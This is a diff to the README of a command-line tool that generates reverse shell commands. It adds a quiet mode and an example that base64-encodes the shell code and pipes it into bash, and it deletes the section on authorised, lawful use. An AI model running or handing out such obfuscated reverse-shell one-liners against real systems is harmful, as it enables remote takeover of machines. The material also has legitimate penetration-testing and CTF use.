@@ -18,6 +18,8 @@ Usage of revshells-cli:
         Mode for listener (gui/cli) (default "gui")
   -p string
         the port number (default "4444")
+  -q    Only output the shell code to stdout for use in other scripts
+        Ignores -l flag if used
   -r string
         Choose the reverse shell format (default "bash")
   -s string
@@ -40,6 +42,10 @@ Usage of revshells-cli:
 - **Generate Reverse Shell Commands:**
   ```
   ./revshells-cli -s bash -i tun0 -p 4444 -r bash
+  ```
+- **Use with Quiet Mode**
+  ```
+  echo "echo '$(./revshells-cli -e base64 -q)' | base64 -d | bash" 
   ```
 
 - **Set Up Listeners (examples):**
@@ -78,24 +84,6 @@ Usage of revshells-cli:
 
 ## Contributing
 - Contributions are welcome. Please submit pull requests or report issues for improvements.
-
-## Legal Notice
-
-This repository provides tools and scripts intended for educational and ethical use only. It is crucial to understand that any misuse of these tools and scripts for malicious or unauthorized activities is strictly prohibited and could lead to legal consequences.
-
-### User Responsibility
-
-- **Authorized Use Only**: These tools and scripts should only be used in environments where you have explicit permission, such as in controlled settings like CTFs (Capture The Flag competitions), authorized penetration testing, or personal testing labs.
-
-- **Compliance with Laws**: Users must ensure that their use of these tools and scripts adheres to all applicable local, state, national, and international laws. Unauthorized access to computer systems is illegal and punishable by law.
-
-- **No Liability for Misuse**: The creator(s) of these tools and scripts shall not be held liable for any misuse, damages, or legal consequences resulting from the use of these resources. Users are responsible for their actions and any repercussions that may arise from improper use.
-
-- **Ethical Intent**: These tools and scripts are developed to enhance cybersecurity knowledge, bolster defensive strategies, and support ethical hacking practices. They are not intended for malicious or unethical purposes.
-
-### Acknowledgement of Risk
-
-By using these tools and scripts, users acknowledge the risks associated with cybersecurity practices and accept full responsibility for ensuring ethical and legal use. Misuse of these tools can result in legal action and severe penalties. Always practice responsible and ethical hacking.
 
 ## License
 - MIT
